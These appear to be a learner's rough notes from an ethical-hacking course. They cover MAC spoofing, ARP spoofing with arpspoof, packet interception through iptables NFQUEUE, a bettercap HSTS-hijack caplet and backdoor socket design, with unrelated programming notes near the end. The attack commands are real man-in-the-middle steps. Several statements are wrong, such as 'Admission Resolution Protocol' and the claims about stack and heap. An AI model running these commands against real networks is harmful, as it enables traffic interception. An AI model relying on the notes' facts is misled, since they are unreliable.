MAC address = unique for global, connected or disconnected 
Tranfer data between data
Why change MAC address
Increase Anonymity
Impersonate other devices
Bypass filters
ifconfig (eth0/wlan0) down 
ether = mac address
ifconfig (eth0/wlan0) hw ether 00:11:22:33:44:55   [12 characters]
Enable the interface
ifconfig eth0 up



python program to automate mac address changer
#!/usr/bin/python
import subprocess
subprocess.call("ifconfig",Shell=True)
subprocess.call("ifconfig wlan0 hw ether 00:11:22:33:44:55",Shell=True)
subprocess.call("ifconfig wlan0 up",Shell=True)




netdiscover -r 10.0.2.1/24 

Communication between a network = MAC  
Communication between different  network = IP address
ARP = Admission Resolution Protocol
ARP : I do not kow the mac address, but I know the IP address, who is this? send me the MAC 

rout -n
hwsrc = hardware source / mac address
psrc = packet source





ARP spoffing:
Physical address(windows can be exploit)

arp -a
arpspoof -i eth0 -t  [victim ip addresss]  [hacker ip address]
echo 1 > /proc/sys/net/ipv4/ip_forward       # Port forwarding(linux initially stopped)
(automatically to our mac address [])




Strings & Bytes Difference 
String:
- Sequences of characters
- Human Readable
Bytes:
- Sequence of bytes
- Machine readable

pip install netfilterqueue
iptables -I FORWARD -J NFQUEUE --queue-num 0
iptables --flush

sport
dport = http
seq 
ack 
ack = seq
remove len , chksum
modified the value so need to chane, scapy will then auto 
gzip : html 
Oh wait! this is more length than expected; so cut the connection 
contenet length change ? what should we do : Python Regex
treat the variable as a number
bettercap -iface eth0 -caplet hstshijack/hstshijack
bettercap 80 -> 8080 in py code

Backdoor socket
Problem :
- TCP is streamed based
- Difficult to identify the end of message / batch
Soluion :
- Make sure the message is well defined
- Implement a protocol that send and receive methods conform to
    * Send size of message as header
    * Append a end-of-message mark to the end of each message
    * Serialize the message
Backdoor Serialization
1. Message is well defined, reciver knows if message is incomplete
2. Can be used transfer objects (lists, dicts,)

Implementation
* JSON and Pickle are common solutions
* JSON (Javascript Object Notation) is implemented many programming languages
* Represents objects as text
* Widely used when transferring data between client and servers

stack = faster, mutable
heap = slow, imutable
camel case = helloWorld
snake case = hello_world
kebab case = hello-world
Hoisting = other functions can be written below main function
Statement = anything that does not returns a value
Expression = anything that return a vallue
C, C++ ---> Memory managment control issue
Garbage collector  solved this issue, but created a new issue -> slow performance [ stopping & resuming the program]
shadowing 
let x = 5
let x = x + 1

How to attack a websiite
An application installed on a computer       ----------> web application pentesting
Computer uses an OS + other                  ----------> server side attacks
Managed by humans                            ----------> client side attacks
